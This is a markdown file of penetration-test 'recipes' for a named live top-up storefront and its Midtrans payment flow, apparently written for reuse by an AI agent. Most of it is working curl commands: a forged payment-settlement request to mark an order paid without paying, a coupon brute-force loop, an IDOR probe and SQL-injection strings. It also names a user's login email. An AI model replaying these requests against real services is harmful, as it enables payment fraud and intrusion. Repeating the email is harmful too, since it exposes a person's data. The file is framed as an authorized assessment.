# Storefront / Payment-Flow PoC Recipes (New API ecosystem)

Concrete recipes distilled from an authorized assessment of `router.juan.web.id` + `topup.juan.web.id` (Midtrans production). Reuse and adapt — do NOT run destructive steps.

## 1. Map the storefront API
```bash
curl -s "https://TOPUP/" | grep -oE '(src|href)="[^"]+"' | grep -E "app.js|style.css"
# -> /app.js?v=25  (single minified bundle)
curl -s "https://TOPUP/app.js?v=25" -o /tmp/topapp.js
wc -c /tmp/topapp.js
grep -n "fetch('/api" /tmp/topapp.js
# Read context around each hit with read_file offset=LINE-10 limit=60 (awk blocks fail on minified JS)
```

## 2. Catalog disclosure (Low / informational)
```bash
curl -s "https://TOPUP/api/skus" | head -c 1500
# Leaks plan_id, quota, face(USD), rp(IDR), daily limits, role tags — unauthenticated.
```

## 3. Payment-bypass PoC (highest value)
```bash
ORD=$(curl -s -X POST https://TOPUP/api/order -H "Content-Type: application/json" \
  -d '{"sku":"payg-5","name":"x","email":"you@test.com","wa":"08123456789"}')
TOK=$(echo "$ORD" | grep -oE '"token":"[^"]+"' | sed 's/"token":"//;s/"//')

# attempt fake Midtrans settlement (no real payment made)
curl -s -X POST "https://TOPUP/api/order/$TOK/bind" -H "Content-Type: application/json" \
  -d '{"transaction_id":"FAKE-001","transaction_status":"settlement","fraud_status":"accept","payment_type":"bank_transfer"}'

# verify negative: status must stay pending / bound:false
curl -s "https://TOPUP/api/order/$TOK"
```
- SAFE (patched) target: `status:"pending"`, `bound:false`, `paid_at:null`.
- VULNERABLE: status flips to `paid`/`bound:true` with no gateway verification → report payment-bypass.

## 4. IDOR topup-to-victim
```bash
# unknown username must be rejected server-side
curl -s -X POST https://TOPUP/api/order -H "Content-Type: application/json" \
  -d '{"sku":"subs-1","name":"x","email":"you@test.com","wa":"08123456789","username":"nonexistent_user_xyz_999"}'
# Expect: {"error":"username tidak ditemukan. Daftar dulu di router.juan.web.id"}
```

## 5. Coupon / redeem brute (needs valid issuer code)
```bash
for code in PROMO DISKON WELCOME NEW JUAN TEST VIP GRATIS MERDEKA; do
  curl -s -X POST https://TOPUP/api/coupon/validate -H "Content-Type: application/json" \
    -d "{\"code\":\"$code\",\"sku\":\"payg-5\",\"email\":\"you@test.com\",\"base_amount\":5000}"
done
# All "Kode kupon tidak ditemukan" on tested target.
```

## 6. SQLi smoke test (safe)
```bash
curl -s "https://TOPUP/api/user-check?username=Lazarus'--"
curl -s -X POST https://TOPUP/api/coupon/validate -H "Content-Type: application/json" -d '{"code":"x OR 1=1--"}'
# Both return graceful "not found" — sanitized.
```

## Username vs email note
Router `GET /api/user/self` returns BOTH `username:"Lazarus"` (used for topup `username` field) and `email:"stokjbbotk@gmail.com"` (used to LOG IN). Don't confuse them.

## Test-account cleanup
If you registered a test account to reach authenticated surfaces, delete it (via `/api/user/manage` as admin, or ask the operator) before closing — non-destructive mandate.
